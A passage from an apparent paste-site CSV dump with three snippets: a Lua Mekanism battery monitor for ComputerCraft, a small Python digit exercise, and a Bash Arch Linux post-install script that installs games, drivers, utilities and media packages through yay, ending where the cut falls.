id,title,username,language,date,content
xre6x10E,CC mekanism Induction Battery Monitoring V1,THEdarkkman,Lua,Friday 10th of May 2024 01:04:09 PM CDT,"-- Terminal
term.clear()
term.setCursorPos(1,1)

-- Monitor preparation
local monitor = peripheral.find(""monitor"")
if monitor then
    monitor.setBackgroundColour(colors.gray)
    monitor.clear()
    monitor.setCursorPos(1,1)
end

-- Functions
-- Print text serialised
local function printText(text)
    print(textutils.serialise(text))
end

-- Convert Joules to RF(Redstone Flux)
local function convertToRF(amntEnergy)
    return math.floor(amntEnergy / 2.5)
end

-- Find suffix and convert value
local function suffixFinder(val)
    val = val + 1       -- bugProof
    local suffix
    local energy = 1    -- bugProof
    if val < 1000 then
        suffix = ''
    elseif val < 1000000 then
        energy = val / 1000
        suffix = 'k'
    elseif val < 1000000000 then
        energy = val / 1000000
        suffix = 'M'
    elseif val < 1000000000000 then
        energy = val / 1000000000
        suffix = 'G'
    else
        energy = val / 1000000000000
        suffix = 'T'
    end
    return suffix, energy
end

-- Round a number to a specific number of decimal places
local function roundToDecimal(number, decimalPlaces)
    local powerOf10 = 10 ^ decimalPlaces
    return math.floor(number * powerOf10 + 0.5) / powerOf10
end

-- Input X amount of blank spaces
local function blankSpaces(num1)
    local spaces = """"
    for i = 1, num1 do
        spaces = spaces .. "" ""
    end
    return spaces
end

--[[ Monitor draw region
local function drawRegion(posX, posY, color)
    local xx, xy = posX[1], posX[2]
    local yx, yy = posY[1], posY[2]
    for i = 1, yx - xx + 1, 1 do
        monitor.setCursorPos(xx, xy)
        monitor.setBackgroundColour(color)
        monitor.write(blankSpaces(yy - xy))
    end
    monitor.setBackgroundColour(colors.gray)
end]]

-- Monitor draw region
--[[
    - pos1          Top-left coordinates
    - pos2          Bottom-right corner coordinates
    - monitorColor  Color you want to draw with
    - monitor       Monitor you want to draw to
]]  
local function drawRegion(pos1, pos2, monitorColor, monitor)
    local x1, y1 = pos1[1], pos1[2]     -- Top-left corner coordinates
    local x2, y2 = pos2[1], pos2[2]     -- Bottom-right corner coordinates
    local numSpaces = y2 - y1 + 1       -- Calculate the number of blank spaces to write
    if monitor then
        printText(""Monitor is working"")
        printText(""Color: "" .. monitorColor)
        printText(""Drawing region at x1:"" .. x1 .. "" x2:""..x2.."" y1:""..y1.."" y2:""..y2)
        printText(""Drawed region is ""..numSpaces.. "" pixels long"")
    end
    monitor.setBackgroundColour(monitorColor)  -- Set the color for the draw

    -- Loop through each line of the region
    for y = y1, y2 do
        -- Loop through each column of the region
        for x = x1, x2 do
            monitor.setCursorPos(x,y)
            monitor.write("" "")
        end
    end
    -- Reset the background color to the default
    monitor.setBackgroundColour(colors.gray)
end



-- Variable declaration
local inductionPort
local test = true
local pos1
local pos2

-- Check for induction port in every side
for _, side in pairs(peripheral.getNames()) do
    if ""inductionPort"" == peripheral.getType(side) then
        printText(peripheral.getType(side))
        inductionPort = peripheral.wrap(side)
    end
end

-- Get current + max energy
local currentEnergySuffix, currentEnergy = suffixFinder(convertToRF(inductionPort.getEnergy()))
currentEnergy = roundToDecimal(currentEnergy, 2)
local maxEnergySuffix, maxEnergy = suffixFinder(convertToRF(inductionPort.getMaxEnergy()))
maxEnergy = roundToDecimal(maxEnergy, 1)

-- Get input + output + difference
local inputSuffix, energyInput = suffixFinder(convertToRF(inductionPort.getLastInput()))
energyInput = roundToDecimal(energyInput, 0)
local outputSuffix, energyOutput  = suffixFinder(convertToRF(inductionPort.getLastOutput()))
energyOutput = roundToDecimal(energyOutput, 0)
local ioDiff = energyInput - energyOutput

-- Monitor presentation
-- Title
monitor.setCursorPos(1,1)
monitor.write(""INDUCTION BATTERY"")
monitor.setCursorPos(1,2)
monitor.write(""-----------------"")
-- Stored energy
monitor.setCursorPos(1,3)
monitor.write(""Energy"")
monitor.setCursorPos(10,3)
monitor.write("":"")
monitor.setCursorPos(11,3)
monitor.write(currentEnergy ..currentEnergySuffix ..""RF / "" .. maxEnergy ..maxEnergySuffix ..""RF"")
-- Input
monitor.setCursorPos(1,4)
monitor.write(""Input"")
monitor.setCursorPos(10,4)
monitor.write("":"")
monitor.setCursorPos(11,4)
monitor.write(energyInput .. inputSuffix .. ""RF"")
-- Output
monitor.setCursorPos(1,5)
monitor.write(""Output"")
monitor.setCursorPos(10,5)
monitor.write("":"")
monitor.setCursorPos(11,5)
monitor.write(energyOutput .. outputSuffix .. ""RF"")
-- Draw a progress bar
-- Draw the initial bar
local monitorColor = colors.black
pos1 = {1, 18}
pos2 = {29, 19}
drawRegion(pos1, pos2, monitorColor, monitor)
-- Draw the actual bar
monitorColor = colors.red
local progressBar = roundToDecimal(inductionPort.getEnergyFilledPercentage() * 28 + 1, 1)
pos1 = {1, 18}
pos2 = {progressBar, 19}
drawRegion(pos1, pos2, monitorColor, monitor)

if test then
    -- Test and printing
    printText(""Testing print:"")
    printText(""color is "" .. monitorColor)
    printText(inductionPort.getEnergyFilledPercentage())
end"
JexYKxGt,Задача 6,dmemsm,Python,Friday 10th of May 2024 01:03:02 PM CDT,"n = input()
result = []

for i in range(1, len(n)):
    if n[i] == n[i-1]:
        result.append(n[i])

if len(result) > 1:
    print(""False, Петя врёт"")
else:
    d = result[0]
    print(f""Загаданное число: {n.replace(d + d, d)}"")
    print(f""Продублированная цифра: {d}"")
"
DHHHHDZq,installextras,hyperiontitan,Bash,Friday 10th of May 2024 01:01:54 PM CDT,"#!/bin/bash


steaminstall () {

if (lspci | grep VGA | grep ""NVIDIA\|nVidia"" &>/dev/null); then 

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S steam --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-swrast --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-icd-loader --noeditmenu --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libglvnd --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libglvnd --noeditmenu --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-dejavu --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-liberation --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-bitstream-vera --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-droid --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gnu-free-fonts --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S noto-fonts --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-croscore --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-ibm-plex --noeditmenu --noconfirm --needed""


elif (lspci | grep VGA | grep ""Radeon R\|R2/R3/R4/R5"" &>/dev/null); then 

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-radeon --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S steam --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-icd-loader --noeditmenu --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libglvnd --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libglvnd --noeditmenu --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-dejavu --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-liberation --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-bitstream-vera --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-droid --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gnu-free-fonts --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S noto-fonts --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-croscore --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-ibm-plex --noeditmenu --noconfirm --needed""


elif (lspci | grep VGA | grep ""ATI\|AMD/ATI"" &>/dev/null); then 

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S amdvlk --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S steam --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-icd-loader --noeditmenu --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libglvnd --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libglvnd --noeditmenu --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-dejavu --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-liberation --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-bitstream-vera --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-droid --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gnu-free-fonts --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S noto-fonts --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-croscore --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-ibm-plex --noeditmenu --noconfirm --needed""


elif (lspci | grep VGA | grep ""Intel"" &>/dev/null); then 

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-intel --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S steam --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-icd-loader --noeditmenu --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libglvnd --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libglvnd --noeditmenu --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-dejavu --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-liberation --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-bitstream-vera --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-droid --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gnu-free-fonts --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S noto-fonts --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-croscore --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-ibm-plex --noeditmenu --noconfirm --needed""


else

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S steam --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-swrast --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vulkan-icd-loader --noeditmenu --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libglvnd --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libglvnd --noeditmenu --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-dejavu --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-liberation --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-bitstream-vera --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-droid --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gnu-free-fonts --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S noto-fonts --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-croscore --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ttf-ibm-plex --noeditmenu --noconfirm --needed""
fi 


}

extrasinstall () {

# INICIO DE UTILIDADES

if [ ""$UTIL1"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S android-file-transfer --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S android-tools --noconfirm"" 
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S android-udev --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S msmtp --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libmtp --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libcddb --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gvfs --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gvfs-afc --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gvfs-smb --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gvfs-gphoto2 --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gvfs-mtp --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gvfs-goa --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gvfs-nfs --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gvfs-google --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gst-libav --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S dosfstools --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S f2fs-tools --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ntfs-3g --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S udftools --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S nilfs-utils --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S polkit --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gpart --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S mtools --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S cifs-utils --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S jfsutils --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S btrfs-progs --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S xfsprogs --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S reiserfsprogs --noconfirm""
fi


if [ ""$UTIL2"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S xarchiver --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S unarchiver --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S binutils --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gzip --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lha --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lrzip --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lzip --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lz4 --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S p7zip --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S tar --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S xz --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S bzip2 --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S p7zip --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lbzip2 --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S arj --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lzop --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S cpio --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S unrar --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S unzip --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S zstd --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S zip --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lzip --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S unarj --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S zstd --noconfirm""
fi


if [ ""$UTIL3"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ffmpeg --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S aom --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libde265 --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S x265 --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S x264 --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libmpeg2 --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S xvidcore --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libtheora --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libvpx --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S schroedinger --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S sdl --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gstreamer --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gst-plugins-bad --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gst-plugins-base --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gst-plugins-base-libs --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gst-plugins-good --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gst-plugins-ugly --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S xine-lib --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libdvdcss --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libdvdread --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S dvd+rw-tools --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lame --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S jasper --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libmng --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libraw --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libkdcraw --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vcdimager --noconfirm""
fi


if [ ""$UTIL4"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gufw --noconfirm""
fi


if [ ""$UTIL5"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S hardinfo --noconfirm""
fi


if [ ""$UTIL6"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gnome-disk-utility --noconfirm""
fi


if [ ""$UTIL7"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gparted --noconfirm""
fi


if [ ""$UTIL8"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S yt-dlp --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ffmpeg --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S rtmpdump atomicparsley aria2 --noeditmenu --noconfirm --needed""
fi


if [ ""$UTIL9"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S viewnior --noeditmenu --noconfirm --needed""
fi


if [ ""$UTIL10"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gedit --noeditmenu --noconfirm --needed""
fi


if [ ""$UTIL11"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S flatpak --noeditmenu --noconfirm --needed""
fi


if [ ""$UTIL12"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S virt-manager --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S qemu --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S qemu-arch-extra --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S edk2-ovmf --noeditmenu --noconfirm --needed""
fi


if [ ""$UTIL13"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S virtualbox --noeditmenu --noconfirm --needed""
fi


# FIN DE UTILIDADES





if [ ""$TERMI1"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lxterminal --noconfirm""
fi


if [ ""$TERMI2"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S tilix --noconfirm""
fi


if [ ""$TERMI3"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S xfce4-terminal --noconfirm""
fi


if [ ""$TERMI4"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S deepin-terminal --noconfirm""
fi


if [ ""$TERMI5"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S mate-terminal --noconfirm""
fi


if [ ""$TERMI6"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S terminator --noconfirm""
fi


if [ ""$TERMI7"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S st --noeditmenu --noconfirm --needed""
fi


if [ ""$TERMI8"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S alacritty --noconfirm""
fi


if [ ""$TERMI9"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S kitty --noconfirm""
fi





if [ ""$AUDIO1"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pipewire --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pipewire-alsa --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pipewire-pulse --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pipewire-jack --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S gst-plugin-pipewire --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pipewire-media-session --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pipewire-zeroconf --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pipewire-jack-dropin --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-pipewire --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-pipewire-jack --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S helvum --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username systemctl start --user pipewire-pulse.service""
arch-chroot /mnt /bin/bash -c ""systemctl start pipewire-pulse.service""
arch-chroot /mnt /bin/bash -c ""systemctl start pipewire.service""
arch-chroot /mnt /bin/bash -c ""systemctl start pipewire-media-session.service""
arch-chroot /mnt /bin/bash -c ""systemctl start pipewire.service""
arch-chroot /mnt /bin/bash -c ""systemctl start pipewire-media-session.service""

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S wireplumber --noeditmenu --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""systemctl disable pipewire-media-session""
arch-chroot /mnt /bin/bash -c ""systemctl start --user wireplumber.service""
arch-chroot /mnt /bin/bash -c ""systemctl start wireplumber.service""
arch-chroot /mnt /bin/bash -c ""pactl info""
fi



if [ ""$AUDIO2"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pulseaudio --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pulseaudio-alsa --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pavucontrol --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pamixer --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libcanberra-pulse --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libcanberra-gstreamer --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-alsa-plugins --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-libpulse --noeditmenu --noconfirm --needed""
fi



if [ ""$AUDIO3"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S realtime-privileges --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S jack2 --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lib32-jack2 --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S a2jmidid --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S libffado --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S python-dbus --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S waf --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pro-audio --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S lv2-plugins --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S ladspa-plugins --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S dssi-plugins --noconfirm""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vst-plugins --noconfirm""
fi



if [ ""$AUDIO4"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S alsa-utils --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S alsa-plugins --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S alsa-oss --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S alsa-firmware --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S pamixer --noeditmenu --noconfirm --needed""
fi





if [ ""$REPRO1"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S vlc --noeditmenu --noconfirm --needed""
fi

if [ ""$REPRO2"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S mpv --noeditmenu --noconfirm --needed""
fi

if [ ""$REPRO3"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S nuclear-player-bin --noeditmenu --noconfirm --needed""
fi

if [ ""$REPRO4"" == ""true"" ]; then
clear
printf '%*s\n' ""${COLUMNS:-$(tput cols)}"" '' | tr ' ' ""_""
echo -e """"
echo -e ""\t\t\t         Actualizando Keys de Spotify          ""
printf '%*s\n' ""${COLUMNS:-$(tput cols)}"" '' | tr ' ' _
echo -e """"
arch-chroot /mnt /bin/bash -c ""gpg --recv-keys 931FF8E79F0876134EDDBDCCA87FF9DF48BF1C90""
arch-chroot /mnt /bin/bash -c ""gpg --recv-keys 2EBF997C15BDA244B6EBF5D84773BD5E130D1D45""
sleep 10

arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S spotify --noeditmenu --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""sudo -u $username yay -S spotify-adblock-git --noeditmenu --noconfirm --needed""

fi

if [ ""$REPRO5"" == ""true"" ]; then
